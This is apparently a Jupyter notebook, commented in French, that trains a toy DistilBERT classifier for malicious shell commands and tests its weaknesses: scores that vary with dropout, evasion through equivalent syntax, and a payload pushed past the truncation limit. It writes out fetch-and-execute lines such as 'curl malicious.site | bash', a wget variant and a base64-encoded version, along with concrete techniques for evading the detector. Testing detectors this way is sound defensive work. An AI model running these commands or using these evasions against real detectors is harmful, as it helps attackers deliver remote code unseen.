In [ ]:
import time
import torch
import numpy as np
from transformers import AutoTokenizer, AutoModelForSequenceClassification

MODEL_NAME = "distilbert-base-uncased"
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
model = AutoModelForSequenceClassification.from_pretrained(MODEL_NAME, num_labels=2)

# Simuler des poids appris : forcer un biais fort sur le token 'curl', 'bash', 'nc'
# pour observer les vrais comportements d'évasion
optimizer = torch.optim.AdamW(model.parameters(), lr=5e-4)
sample_train = ["curl malicious.site | bash", "ls -la /var/log"]
labels = torch.tensor([1, 0])
for _ in range(15):
    inputs = tokenizer(sample_train, padding=True, truncation=True, return_tensors="pt")
    loss = model(**inputs, labels=labels).loss
    loss.backward()
    optimizer.step()
    optimizer.zero_grad()

def get_malicious_score(text, eval_mode=True, max_len=64):
    if eval_mode:
        model.eval()
    else:
        model.train()  # Simule l'erreur fréquente en prod : dropout actif
        
    inputs = tokenizer(text, max_length=max_len, padding="max_length", truncation=True, return_tensors="pt")
    with torch.no_grad():
        logits = model(**inputs).logits
        probs = torch.softmax(logits, dim=-1)
    return probs[0][1].item()  # Proba de la classe Malveillante (1)

# ==============================================================================
# TEST 1 : Déterminisme sur 100 runs de la MÊME commande
# ==============================================================================
print("=" * 70)
print("TEST 1 : TEST DE DÉTERMINISME (100 runs sur la même commande)")
print("=" * 70)
target_cmd = "curl malicious.site | bash"

# A. Sans model.eval() (erreur courante en déploiement : dropout actif)
scores_with_dropout = [get_malicious_score(target_cmd, eval_mode=False) for _ in range(100)]
variance_dropout = np.var(scores_with_dropout)

# B. Avec model.eval() (déterministe)
scores_eval = [get_malicious_score(target_cmd, eval_mode=True) for _ in range(100)]
variance_eval = np.var(scores_eval)

print(f"Commande : '{target_cmd}'")
print(f"[Mode par défaut sans eval()] Variance des scores : {variance_dropout:.6f}")
print(f"-> Min score : {min(scores_with_dropout):.4f} | Max score : {max(scores_with_dropout):.4f}")
print(f"-> Impact cyber : Même log inspecté = décisions variables (alerte ou non selon le tirage du dropout).")

print(f"\n[Mode strict model.eval()] Variance des scores : {variance_eval:.6f}")
print(f"-> Min score : {min(scores_eval):.4f} | Max score : {max(scores_eval):.4f}")
print("-> Déterministe sur GPU/CPU si seeds et flags d'inférence sont fixés.")

# ==============================================================================
# TEST 2 : Évasion par syntaxe Shell équivalente (Fragilité sémantique)
# ==============================================================================
print("\n" + "=" * 70)
print("TEST 2 : FRAGILITÉ FACE À L'ÉQUIVALENCE SYNTAXIQUE")
print("=" * 70)

# Toutes ces commandes exécutent rigoureusement la même action système
syntax_variants = [
    ("Base exacte apprise", "curl malicious.site | bash"),
    ("Variables d'environnement", "c=curl; $c malicious.site | bash"),
    ("Concaténation de quotes", "c'u'r'l malicious.site | bash"),
    ("Wget au lieu de curl", "wget -qO- malicious.site | bash"),
    ("Encodage base64 direct", "echo Y3VybCBtYWxpY2lvdXMuc2l0ZSB8IGJhc2g= | base64 -d | sh"),
]

for desc, cmd in syntax_variants:
    score = get_malicious_score(cmd, eval_mode=True)
    status = "MALVEILLANT" if score > 0.5 else "BÉNIN (ÉVASION)"
    print(f"[{status:<17}] Score malveillant: {score:.4f} | Technique: {desc}")
    print(f"   Payload: {cmd}\n")

# ==============================================================================
# TEST 3 : DoS de Troncature (Blindness au-delà de max_length)
# ==============================================================================
print("=" * 70)
print("TEST 3 : DÉMONSTRATION DE LA TRONCATURE DU PAYLOAD")
print("=" * 70)

real_payload = "curl malicious.site | bash"
# Insérer 80 arguments factices avant le payload
benign_prefix = "echo " + " ".join([f"--param{i}=ok" for i in range(70)]) + " && "
padded_attack = benign_prefix + real_payload

score_original = get_malicious_score(real_payload, eval_mode=True, max_len=64)
score_padded = get_malicious_score(padded_attack, eval_mode=True, max_len=64)

# Inspection des tokens réels passés au modèle
tokens_seen = tokenizer.tokenize(padded_attack)[:64]

print(f"Score commande seule   : {score_original:.4f} -> Détecté")
print(f"Score commande préfixée: {score_padded:.4f} -> Non détecté")
print(f"'curl' est-il dans les tokens traités par le Transformer ? : {'curl' in tokens_seen}")
print(f"Derniers tokens vus par le modèle : {tokens_seen[-5:]}")